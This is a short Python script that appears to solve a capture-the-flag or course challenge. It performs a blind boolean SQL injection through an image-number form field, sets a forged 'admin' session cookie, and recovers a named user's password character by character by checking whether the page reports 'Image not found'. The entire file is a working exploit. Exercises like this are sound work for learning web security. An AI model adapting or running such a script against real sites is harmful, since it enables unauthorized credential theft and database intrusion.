import requests

#lowrer case 97 122

#upercase 65 90


parameters = {}

headers = {'user-agent': 'firefox/0.0.1'}


jar = requests.cookies.RequestsCookieJar()
jar.set('session', 'admin')


asciiC = 65
asciiL = 97


for y in range (40):

    for x in range(128):

        injection = "' AND (SELECT ASCII(SUBSTRING(password,"+str(y+1)+","+str(y+1)+")) FROM users where username='JinBlack') = "+str(x)+"; -- "
        #asciiC = asciiC + 1

        payload = {'imgnumber': '1' +injection}
        r = requests.post('http://shut.maputo.jinblack.it/', params=parameters, headers=headers, data=payload, cookies=jar)
        if( "Image not found" not in r.text):
            print(chr(x))

#print(r.text)
#print(r.status_code)
